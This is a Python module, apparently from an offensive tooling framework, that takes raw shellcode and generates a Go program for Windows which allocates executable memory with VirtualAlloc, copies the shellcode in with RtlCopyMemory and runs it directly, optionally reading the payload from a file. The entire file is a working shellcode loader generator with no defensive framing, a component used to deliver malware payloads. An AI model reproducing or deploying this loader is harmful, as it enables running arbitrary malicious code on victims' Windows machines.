from ClassCongregation import BinaryDataTypeConversion
import ast
__heading__="Go-EXE-Windows-Syscall"
__language__=".go"
__process__=".exe"

def main(Shellcode):
    BinaryData=BinaryDataTypeConversion().StringToGoArray(ast.literal_eval(repr(Shellcode).replace("\\\\", "\\")))#对数据进行类型转换
    Code ="""
package main

import (
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
	shellcode_buf =  """+BinaryData+""")

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func main() {
	shellcode := shellcode_buf
	if len(os.Args) > 1 {
		shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
		checkErr(err)
		shellcode = shellcodeFileData
	}

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)
	syscall.Syscall(addr, 0, 0, 0, 0)
}

"""
    print(Code)
    return Code


